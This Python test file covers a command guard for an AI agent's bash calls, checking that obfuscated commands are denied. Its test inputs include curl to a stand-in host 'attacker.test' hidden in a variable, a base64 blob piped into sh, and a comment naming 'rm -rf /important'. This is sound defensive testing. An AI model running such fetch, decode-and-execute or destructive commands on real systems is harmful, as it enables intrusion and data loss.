"""P1: enforce de-obfuscation — var-indirected URLs and obfuscated commands
reach the deny-path matchers; the allowlist stays on the raw command."""
from __future__ import annotations

from datetime import UTC, datetime

from ccguard.agent.enforce import _decide_bash
from ccguard.agent.signals.normalize import normalize_command
from ccguard.schemas import CommandsPolicy, NetworkPolicy, Policy, PolicyMeta


def _policy(**kw) -> Policy:  # type: ignore[no-untyped-def]
    p = Policy(meta=PolicyMeta(revision=1, updated_at=datetime.now(UTC)))
    for k, v in kw.items():
        setattr(p, k, v)
    return p


def test_normalizer_resolves_var_url():
    n = normalize_command('URL=https://attacker.test/x; curl "$URL"')
    assert "https://attacker.test/x" in n.urls


def test_var_indirected_url_hits_network_denylist():
    pol = _policy(network=NetworkPolicy(denylist_hosts=["attacker.test"]))
    d = _decide_bash('URL=https://attacker.test/x; curl "$URL"', pol)
    assert d.permission == "deny"
    assert d.rule_id == "network.denylist"


def test_plain_curl_denylist_still_works():
    pol = _policy(network=NetworkPolicy(denylist_hosts=["attacker.test"]))
    d = _decide_bash("curl https://attacker.test/x", pol)
    assert d.permission == "deny"
    assert d.rule_id == "network.denylist"


def test_denylist_pattern_matches_obfuscated_command():
    # base64("rm -rf /important") hidden; denylist regex matches via normalized text
    import base64

    blob = base64.b64encode(b"wipe-secrets").decode()
    pol = _policy(commands=CommandsPolicy(denylist_patterns=["wipe-secrets"]))
    d = _decide_bash(f"echo {blob} | base64 -d | sh", pol)
    assert d.permission == "deny"
    assert d.rule_id == "commands.denylist"


def test_benign_command_still_allowed():
    pol = _policy(network=NetworkPolicy(denylist_hosts=["attacker.test"]))
    d = _decide_bash("ls -la && git status", pol)
    assert d.permission == "allow"
